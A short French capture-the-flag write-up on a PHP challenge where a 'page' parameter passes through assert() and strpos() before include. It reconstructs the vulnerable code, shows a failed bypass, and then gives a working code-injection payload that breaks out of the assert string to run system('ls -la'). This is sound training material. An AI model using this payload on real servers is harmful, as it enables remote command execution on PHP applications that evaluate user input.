
# Assert

On identifie rapidement dans l'url le paramètre "page" qui semble vulnérable à une LFI.

Après quelques tests et en regardant les erreurs, on comprend que le fichier PHP vérifie l'absence de '..' avec la fonction `assert` et la fonction `strpos`, puis il utilise certainement la fonction `include` pour afficher le fichier sélectionné. 

Le code PHP doit ressembler à ça :
```PHP
<?

assert("strpos('includes/' . $GET['page'] . '.php', '..')===false");

include 'includes/' . $GET['page'] . '.php';

?>
```

## Fausse piste
On peut contourner le filtre en réécrivant la condition puis en commentant la suite : on utilise l'input suivant `../test','ppp')===false ; //`.

Cependant, ce fichier n'est pas valide pour être affiché ensuite et on n'a l'erreur `'includes/../test','ppp')===false ; //.php' File does not exist`.

## Solution
En lisant la doc de `assert` on comprend qu'elle va évaluer notre code comme la fonction `eval`.

Il suffit d'injecter du code sans tout casser :
`page=','..') === <command> or strpos('xxx`
Ce qui donne :
```php
assert("strpos('includes/','..') === <command> or strpos('xxx.php', '..')===false");
```

On peut ensuite faire `command = system("ls -la")`
Et puis on lit le flag.